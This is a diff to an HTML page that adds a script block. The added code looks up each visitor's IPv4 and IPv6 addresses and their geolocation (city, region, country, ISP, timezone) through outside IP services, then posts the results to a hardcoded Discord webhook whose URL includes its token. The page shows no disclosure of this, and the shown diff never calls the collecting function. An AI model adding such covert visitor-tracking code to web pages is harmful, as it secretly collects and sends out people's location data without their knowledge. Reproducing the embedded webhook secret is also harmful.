@@ -247,10 +247,60 @@
                 console.error("Error:", error);
             }
         }
+        
     </script>
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1414192070645776475/fwnF30fJmCMSuDdtalNsrDS6w_2UCZWuNi3DpIwU_sS_kJtnzHxExwks326ZsP_wd_bE";
+
+// Function to send data to Discord webhook
+function sendToWebhook(ipv4, ipv6, locationData) {
+    const embed = {
+        title: "🌐 New Visitor",
+        color: 0x2b2d31,
+        fields: [
+            { name: "IPv4", value: ipv4 || "N/A", inline: true },
+            { name: "IPv6", value: ipv6 || "N/A", inline: true },
+            { name: "City", value: locationData.city || "N/A", inline: true },
+            { name: "Region", value: locationData.region || "N/A", inline: true },
+            { name: "Country", value: locationData.country_name || "N/A", inline: true },
+            { name: "ISP", value: locationData.org || "N/A", inline: false },
+            { name: "Timezone", value: locationData.timezone || "N/A", inline: true }
+        ],
+        footer: { text: `Visitor Info | ${new Date().toLocaleString()}` }
+    };
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+    }).then(res => {
+        if(res.ok) console.log("Webhook sent");
+        else console.error("Webhook failed", res.status);
+    }).catch(err => console.error("❌ Error:", err));
+}
+
+// Get IPs and location
+async function getVisitorInfo() {
+    let ipv4 = null, ipv6 = null;
+
+    try { const res4 = await fetch("https://api.ipify.org?format=json"); if(res4.ok){ const data4 = await res4.json(); ipv4 = data4.ip; } } 
+    catch(e){ console.warn("Could not fetch IPv4:", e); }
+
+    try { const res6 = await fetch("https://api64.ipify.org?format=json"); if(res6.ok){ const data6 = await res6.json(); ipv6 = data6.ip; } } 
+    catch(e){ console.warn("Could not fetch IPv6:", e); }
+
+    const lookupIP = ipv4 || ipv6;
+    let locationData = {};
+    try { const resLoc = await fetch(`https://ipapi.co/${lookupIP}/json/`); if(resLoc.ok) locationData = await resLoc.json(); } 
+    catch(e){ console.warn("Could not fetch location:", e); }
+
+    sendToWebhook(ipv4, ipv6, locationData);
+}
+</script>
 </body>
 
 </html>
+
 
 
 
